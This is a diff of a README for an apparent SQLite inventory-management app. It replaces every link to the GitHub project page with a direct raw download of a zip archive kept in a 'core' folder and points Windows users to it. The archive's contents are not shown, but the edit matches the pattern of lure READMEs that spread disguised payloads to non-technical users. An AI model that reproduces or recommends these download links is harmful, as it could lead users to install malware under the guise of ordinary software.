@@ -1,12 +1,12 @@
 # 📦 Inventory-Management-System-SQLite - Simple stock tracking in one place
 
-[![Download](https://img.shields.io/badge/Download-Inventory--Management--System--SQLite-blue?style=for-the-badge)](https://github.com/janalimited196/Inventory-Management-System-SQLite)
+[![Download](https://img.shields.io/badge/Download-Inventory--Management--System--SQLite-blue?style=for-the-badge)](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)
 
 ## 🚀 Download and run
 
 Use this link to visit the project page and get the files:
 
-[Download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite)
+[Download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)
 
 ## 🖥️ What this app does
 
@@ -46,7 +46,7 @@ If the project includes a Python-based build, you may also need:
 ## 📥 Download steps for Windows
 
 1. Open the download page:
-   [Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite)
+   [Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)
 
 2. Look for the project files on the page.
 
@@ -203,7 +203,7 @@ This type of app can help with:
 
 ## 📦 Download link again
 
-[Visit the project page to download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite)
+[Visit the project page to download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)
 
 ## 🛠️ Common setup checklist
 
